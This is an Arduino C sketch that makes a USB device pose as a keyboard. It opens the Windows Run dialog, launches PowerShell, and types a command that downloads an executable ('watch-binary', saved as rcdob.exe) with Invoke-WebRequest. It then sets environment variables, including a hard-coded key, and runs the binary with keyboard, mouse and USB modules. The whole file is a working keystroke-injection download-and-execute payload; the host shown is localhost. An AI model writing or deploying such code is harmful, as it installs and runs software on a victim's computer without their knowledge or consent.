#include "Keyboard.h"

char notifyConfig[] = "$Env:RCDO_NOTIFY=0; `\n";
char apiKey[] = "$Env:RCDO_KEY=\"whyare\"; `\n";
char dlCmd[] = "iwr -Uri http://localhost:5000/download/bin/watch-binary -OutFile $Env:temp\\rcdob.exe; `\n"; 


char* selectModules(int *menuSelected){
  char* modules = (char*)calloc(512,1);
  if (modules == NULL){
    // handle error
    return "";
  }

  if (menuSelected[0]){
    strcat(modules," keyboard");
  }
  if (menuSelected[1]){
    strcat(modules," mouse");
  }
  if (menuSelected[2]){
    strcat(modules," usb");
  }
  return modules;
}


// Keyboard needs to begin before this function is called.
void runPS(){
  Keyboard.write(0);
  delay(30);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.print('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell.exe");
  Keyboard.write(KEY_RETURN);
  delay(500);
}


void downloadBin(){
  Keyboard.print("cd $Env:TEMP; `\n");
  Keyboard.print(dlCmd);
}

void setupConfig(int notify){
  Keyboard.print(apiKey);
  if (!notify){
    Keyboard.print(notifyConfig);
  }
}


void startBinary(int *option){
  Keyboard.begin();
  runPS();
  downloadBin();
  setupConfig(option[3]);
  //strcpy(buf,binaryCmdline);
  char *mods = selectModules(option);

  Keyboard.print(".\\rcdob.exe ");
  Keyboard.print(mods);
  Keyboard.print("; `\nexit\n");

  free(mods);
  Keyboard.end();
}
